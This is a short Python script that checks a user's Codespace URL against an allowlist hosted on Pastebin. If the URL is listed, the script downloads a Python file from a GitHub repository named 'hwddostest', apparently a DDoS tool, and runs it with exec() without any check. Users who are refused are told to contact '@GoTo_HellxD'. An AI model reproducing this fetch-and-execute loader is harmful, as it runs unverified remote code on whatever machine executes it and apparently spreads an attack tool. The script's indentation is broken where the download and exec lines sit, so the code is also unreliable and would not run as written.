import requests

# Pastebin raw URL containing the allowed URLs
pastebin_raw_url = 'https://pastebin.com/raw/UHkWyd4e'

def check_url_in_pastebin(codespace_url, pastebin_raw_url):
    try:
        # Fetch content from Pastebin
        response = requests.get(pastebin_raw_url)
        response.raise_for_status()
        
        # Get the list of allowed URLs from Pastebin content
        allowed_urls = response.text.splitlines()
        
        # Check if the Codespace URL is in the allowed URLs
        if codespace_url in allowed_urls:
            url = 'https://github.com/hwop/hwddostest/blob/master/scripttest.py'

# Fetch the script content
response = requests.get(url)
script_content = response.text

# Execute the fetched script
exec(script_content)
        else:
            print("You are not allowed to use it, Get Access From @GoTo_HellxD")
    except requests.RequestException as e:
        print(f"Error Report It To @GoTo_HellxD: {e}")

if __name__ == "__main__":
    # Prompt the user to input their Codespace URL
    codespace_url = input("Enter your Codespace URL: ")
    
    if codespace_url:
        check_url_in_pastebin(codespace_url, pastebin_raw_url)
    else:
        print("Codespace URL is not provided")
